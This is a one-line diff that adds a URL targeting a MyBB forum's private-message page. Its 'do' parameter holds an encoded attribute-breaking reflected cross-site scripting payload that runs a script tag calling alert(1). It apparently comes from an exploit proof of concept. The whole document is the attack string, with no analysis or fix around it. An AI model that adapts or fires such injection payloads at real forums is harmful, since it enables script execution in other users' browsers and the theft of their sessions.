@@ -1,0 +1,1 @@
+http://www.example.com/mybb/private.php?to=asda&amp;subject=asd%3E&amp;font=-&amp;size=-&amp;color=-&amp;mode=advanced&amp;message=sd&amp;options%5Bsavecopy%5D=yes&amp;options%5Breadreceipt%5D=yes&amp;action=do_send&amp;pmid=&amp;do=D3vil-0x1%22%3E%3Cscript%3Ealert(1);%3C/script%3E&amp;preview=Preview
